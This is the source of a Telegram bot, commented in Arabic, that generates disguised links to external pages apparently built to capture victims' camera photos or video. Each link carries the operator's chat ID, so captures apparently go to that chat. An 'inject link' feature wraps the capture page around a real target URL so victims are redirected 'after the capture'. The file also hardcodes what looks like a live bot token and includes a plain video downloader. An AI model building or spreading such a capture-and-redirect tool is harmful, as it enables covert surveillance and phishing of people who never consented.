import os
import json
import urllib3
import telebot
from telebot import types
import threading
import http.server
import yt_dlp

# إيقاف التحذيرات
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

DB_FILE = "/tmp/voice_db.json"
# الروابط الأساسية للصفحات
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}

# --- السيرفر للبقاء نشطاً ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

def load_db():
    if not os.path.exists(DB_FILE): return {"girl_1": {}, "girl_2": {}}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {"girl_1": {}, "girl_2": {}}

# --- دالة التحميل ---
def download_video_sync(url, chat_id):
    try:
        file_path = f'/tmp/vid_{chat_id}.mp4'
        ydl_opts = {
            'format': 'best[ext=mp4]/best',
            'outtmpl': file_path,
            'quiet': True,
            'no_warnings': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            if os.path.exists(file_path): os.remove(file_path)
            info = ydl.extract_info(url, download=True)
            return file_path, info.get('title', 'Video')
    except Exception as e: return None, str(e)

def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ رابط تعديل", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🔒 حقن رابط", callback_data="inject_start")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "👋 أهلاً بك يا سيف الدين، أنا جاهز!", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    
    if call.data == "inject_start":
        user_states[chat_id] = "waiting_for_inject_link"
        bot.edit_message_text("🔗 أرسل الرابط الأصلي الذي تريد توجيه المستخدم إليه بعد الالتقاط:", chat_id, call.message.message_id)
    
    elif call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو للتحميل:", chat_id, call.message.message_id)
        
    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link": bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
    
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    if state == "waiting_for_inject_link":
        original_url = message.text if message.text.startswith("http") else f"https://{message.text}"
        # توليد رابط الحقن (يجمع صفحة الالتقاط مع الرابط المستهدف)
        injected_link = f"{PHOTO_PAGE_URL}?target={original_url}&chatId={chat_id}"
        bot.reply_to(message, f"✅ تم دمج الرابط بنجاح:\n\n{injected_link}")
        user_states[chat_id] = None
        
    elif state == "waiting_for_url":
        status_msg = bot.reply_to(message, "⏳ جاري التحميل...")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            bot.delete_message(chat_id, status_msg.message_id)
            os.remove(path)
        else:
            bot.edit_message_text(f"❌ فشل:\n{title}", chat_id, status_msg.message_id)
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
